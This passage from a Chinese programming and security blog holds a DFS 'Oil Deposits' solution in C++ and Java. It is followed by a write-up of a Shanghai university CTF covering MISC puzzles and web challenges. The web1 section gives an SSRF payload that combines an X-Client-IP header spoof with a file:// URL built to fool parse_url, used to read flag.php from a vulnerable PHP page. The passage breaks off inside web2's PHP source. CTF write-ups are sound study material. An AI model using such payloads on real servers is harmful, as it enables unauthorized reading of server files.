i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//定义全局的，m和n</span><span class="token keyword">int</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//主函数</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>flag<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//接受多组数据</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span> n<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                cin<span class="token operator">>></span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                    flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义深度优先搜索</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//跟个扫描仪似的，递归搜索</span>    <span class="token comment" spellcheck="true">//如果不为@或者超出范围，则停止该方向搜索</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'@'</span><span class="token operator">||</span>i<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>j<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>i<span class="token operator">></span>m<span class="token operator">||</span>j<span class="token operator">></span>n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//向八个方向进行继续搜索</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//根据dfs的特点，访问过的顶点需要标记(这里置为*)，防止重复递归爆炸</span>        map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'*'</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>java重构版:</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DFS_Oil_Deposits</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//注意这里因为是动态申请数组，与C++不同，如果不先判断好参数大小，会导致数组越界的问题</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> j <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span>i <span class="token operator">>=</span> m <span class="token operator">||</span> j <span class="token operator">>=</span> n <span class="token operator">||</span> map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//向八个方向进行继续搜索</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//根据dfs的特点，访问过的顶点需要标记(这里置为*)，防止重复递归爆炸</span>            map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'*'</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//当元素过多无法列举时，动态申请数组以下面这种方式</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> flag1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//用Scanner定义输入</span>        Scanner cin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//相当于c++中的EOF判断</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>cin<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            flag1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                m <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                n <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> flag <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> flag<span class="token operator">++</span><span class="token punctuation">)</span>                    map<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//                for (i = 0; i &lt; m; i++) {</span><span class="token comment" spellcheck="true">//                    for (j = 0; j &lt; n; j++) {</span><span class="token comment" spellcheck="true">//                        //map[i][j] = mapstrings[i][j];</span><span class="token comment" spellcheck="true">//                        System.out.print(map[i][j]);</span><span class="token comment" spellcheck="true">//                    }</span><span class="token comment" spellcheck="true">//                    System.out.print('\n');</span><span class="token comment" spellcheck="true">//                }</span><span class="token comment" spellcheck="true">//            }</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">//        }</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'@'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>                            flag1 <span class="token operator">=</span> flag1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>其实是顺便练习一下java，c++和java有比较多相似之处，但是也有一些不同的地方，所以需要好好注意。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DFS </tag>
            
            <tag> algorithm </tag>
            
            <tag> 算法 </tag>
            
            <tag> coding </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第四届全国邀请赛_赛后小结</title>
      <link href="/2018/11/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E7%BD%91%E5%AE%89%E6%9A%A8%E5%85%A8%E5%9B%BD%E9%82%80%E8%AF%B7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%B0%8F%E7%BB%93/"/>
      <url>/2018/11/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E7%BD%91%E5%AE%89%E6%9A%A8%E5%85%A8%E5%9B%BD%E9%82%80%E8%AF%B7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="第四届上海网安暨全国邀请赛-赛后小结"><a href="#第四届上海网安暨全国邀请赛-赛后小结" class="headerlink" title="第四届上海网安暨全国邀请赛_赛后小结"></a>第四届上海网安暨全国邀请赛_赛后小结</h1><blockquote><p>打完这个第四届上海大学生网络安全竞赛后，简单做个小结，巩固一下😭。</p></blockquote><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到BASE32"><a href="#签到BASE32" class="headerlink" title="签到BASE32"></a>签到BASE32</h3><blockquote><p>第一道题是BASE32，签到题，飘过。</p></blockquote><h3 id="pyc反编译"><a href="#pyc反编译" class="headerlink" title="pyc反编译"></a>pyc反编译</h3><blockquote><p>第二题是python的反编译，一个pyc文件。</p><p>可能我是碰巧做出来的，通过import导包（import是个好东西，pyc都能导），可以得到一个列表<code>[0,10,7,1,29,14,7,22,22,31,57,30,9,52,27]</code>，按列表顺序依次对”f”,”l”,”a”,”g”,异或可以得到key值为102，然后对列表进行异或操作可以得到flag。</p><p>但是大佬们是怎么去做这题的呢：发现pyc文件中有恶意插入的一行字节码，正是因为这个，导致pyc无法被反编译，删除之后反编译可以得到：</p><pre class=" language-assembly"><code class="language-assembly">1       0  JUMP_ABSOLUTE         6  'to 6'           3             6  JUMP_ABSOLUTE         9  'to 9'           9  LOAD_CONST            0  ''          12  LOAD_CONST            1  10          15  LOAD_CONST            2  7          18  LOAD_CONST            3  1          21  LOAD_CONST            4  29          24  LOAD_CONST            5  14          27  LOAD_CONST            2  7          30  LOAD_CONST            6  22          33  LOAD_CONST            6  22          36  LOAD_CONST            7  31          39  LOAD_CONST            8  57          42  LOAD_CONST            9  30          45  LOAD_CONST           10  9          48  LOAD_CONST           11  52   2      51  LOAD_CONST           12  27          54  BUILD_LIST_15        15          57  STORE_NAME            0  'cmp'   3      60  LOAD_NAME             1  'raw_input'          63  CALL_FUNCTION_0       0   4      66  STORE_NAME            2  'flag'          69  LOAD_CONST            0  ''          72  STORE_NAME            3  'm'          75  SETUP_LOOP           91  'to 169'          78  LOAD_NAME             2  'flag'          81  GET_ITER          82  FOR_ITER             83  'to 168'          85  STORE_NAME            4  'i'          88  LOAD_NAME             5  'ord'          91  LOAD_NAME             4  'i'          94  CALL_FUNCTION_1       1          97  UNARY_INVERT          98  LOAD_CONST           13  102         101  BINARY_AND         102  LOAD_NAME             5  'ord'         105  LOAD_NAME             4  'i'         108  CALL_FUNCTION_1       1         111  LOAD_CONST           18  -103         114  BINARY_AND         115  BINARY_OR         116  STORE_NAME            4  'i'         119  LOAD_NAME             4  'i'         122  LOAD_NAME             0  'cmp'         125  LOAD_NAME             3  'm'         128  BINARY_SUBSCR         129  COMPARE_OP            2  '=='         132  POP_JUMP_IF_FALSE   144  'to 144'         135  LOAD_NAME             3  'm'   8     138  UNARY_NEGATIVE         139  LOAD_CONST           14  -1         142  BINARY_ADD         143  UNARY_NEGATIVE  10     144  STORE_NAME            3  'm'         147  JUMP_BACK            73  'to 73'         150  CONTINUE             73  'to 73'         153  LOAD_CONST           15  'wrong'         156  PRINT_ITEM         157  PRINT_NEWLINE_CONT         158  LOAD_NAME             6  'exit'         161  CALL_FUNCTION_0       0         164  POP_TOP         165  JUMP_BACK            73  'to 73'         168  POP_BLOCK       169_0  COME_FROM                '75'         169  LOAD_CONST           16  'right'         172  PRINT_ITEM         173  PRINT_NEWLINE_CONT</code></pre><p>分析清楚逻辑之后可以逆出flag。</p></blockquote><h3 id="N0find"><a href="#N0find" class="headerlink" title="N0find"></a>N0find</h3><blockquote><p>大杂烩，首先通过wireshark提取出两张图片（实际上数据包中还藏着一些不为人知的东西），其中一张是关键：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/ctfisfun.jpeg" alt=""></p><p>可以看到有个<code>ct??????</code>，莫非是ctf什么的，六个问号，八位。（后面官方给出提示，openbuff（某一不知道哪个角落的隐写软件），crc碰撞，以及碰撞出来的值中含有f）。</p><p>这个时候就懵逼了，拿什么去crc碰撞，碰撞完又能干啥？</p><p>仔细看看数据包中，出现了crc字眼，并且含有3个疑似crc的值：</p><p><code>C61B1F65</code>,<code>E74E142D</code>,<code>648BDAD5</code></p><p>拿crc碰撞脚本进行碰撞得到三组中每组含有f的值：</p><p>1.<code>93fjhl    fBWjIv</code></p><p>2.<code>mbof3k      Xez1fW</code></p><p>3.<code>v4gfx1    5fyJIo</code></p><p>然后拿openbuff进行解密，需要三个密钥，也就是上面三组进行排列组合，而且开头还需要加上ct，即可getflag。</p></blockquote><h3 id="92"><a href="#92" class="headerlink" title="92"></a>92</h3><blockquote><p>emmm没啥好说的，考点就是字符串反转，以及对字符的敏感性，还有对base92的了解，题目给出了92基本上可以知道base92这玩意儿了，后面的难度不是特别大，需要一定的灵活性。</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><blockquote><p>这次的web感觉全是php，比较”硬核”。</p></blockquote><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><blockquote><p>通过post 传admin=1并且用x-client-ip伪造本地ip，即可到达用url打ssrf的地步，通过指定url，打到的内容会以图片格式存储到download目录。</p><p>这里需要用 file协议，而不是http协议。</p><p>大佬是这样构造url的：</p><p><code>url=file://@127.0.0.1:80@www.ichunqiu.com/./..//var/www/html/flag.php</code></p><p>而我：</p><p><code>url=file://www.ichunqiu.com/var/www/html/flag.php</code></p><p>可能又是碰巧打到的？我们可以获得source.php的源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"you need to login as admin!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;!-- post param  'admin' -->"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'www.ichunqiu.com'</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'download/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">';img1.jpg'</span><span class="token punctuation">;</span>                <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$img</span><span class="token operator">=</span><span class="token string">"&lt;img src=\""</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">"\"/>"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> "you need post url<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.ichunqiu.com";</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"only 127.0.0.1 can get the flag!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>实际上考的是<code>libcurl</code>and<code>parse_url()</code>解析问题。</p><p>这里可以参考<a href="http://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize(" target="_blank" rel="noopener">一叶飘零师傅</a>/)写的一篇博文。</p></blockquote><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><blockquote><p>扫目录得swp交换文件==&gt;vim恢复文件==&gt;得到index.php源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">come</span><span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">waf</span><span class="token 